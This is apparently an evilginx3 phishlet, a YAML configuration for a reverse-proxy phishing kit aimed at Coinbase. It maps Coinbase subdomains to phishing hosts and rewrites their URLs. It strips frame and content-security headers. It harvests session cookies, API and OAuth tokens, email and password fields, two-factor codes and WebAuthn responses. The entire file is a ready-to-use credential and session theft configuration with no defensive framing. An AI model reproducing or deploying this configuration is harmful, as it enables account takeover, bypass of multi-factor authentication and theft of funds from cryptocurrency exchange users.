min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://www.coinbase.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'coinbase.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'coinbase.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'coinbase.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'coinbase.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'coinbase.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Coinbase domain URLs
  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'coinbase.com', search: 'https://www\\.coinbase\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.coinbase.com', orig_sub: 'login', domain: 'coinbase.com', search: 'https://login\\.coinbase\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.coinbase.com', orig_sub: 'api', domain: 'coinbase.com', search: 'https://api\\.coinbase\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.coinbase.com', orig_sub: 'accounts', domain: 'coinbase.com', search: 'https://accounts\\.coinbase\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'www.coinbase.com', orig_sub: 'static', domain: 'coinbase.com', search: 'https://static\\.coinbase\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'coinbase.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'coinbase.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.coinbase.com', orig_sub: 'login', domain: 'coinbase.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.coinbase.com', orig_sub: 'login', domain: 'coinbase.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Coinbase authentication cookies
  - domain: '.coinbase.com'
    keys: ['__cf_bm', '_coinbase_session', 'cb_dm', 'cb_ls', 'device_id', 'country_code']
    type: 'cookie'
  
  # Session and tracking cookies
  - domain: '.coinbase.com'
    keys: ['_ga', '_gid', '_gat', 'analytics_session', 'optimizelyEndUserId']
    type: 'cookie'
    optional: true
  
  # API and OAuth tokens
  - domain: '.coinbase.com'
    keys: ['api_key', 'oauth_token', 'refresh_token']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'json'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'json'
  
  # Alternative POST fields
  email_post:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  password_post:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  two_factor_code:
    key: 'two_factor_token'
    search: '(.*)'
    type: 'json'
  
  authenticator_code:
    key: 'authenticator_code'
    search: '(.*)'
    type: 'json'
  
  # WebAuthn/U2F challenge responses
  webauthn_response:
    key: 'webauthn_response'
    search: '(.*)'
    type: 'json'

auth_urls:
  - '/dashboard'
  - '/settings'
  - '/transactions'
  - '/portfolio'
  - '/assets'
  - '/prices'

login:
  domain: 'www.coinbase.com'
  path: '/signin'

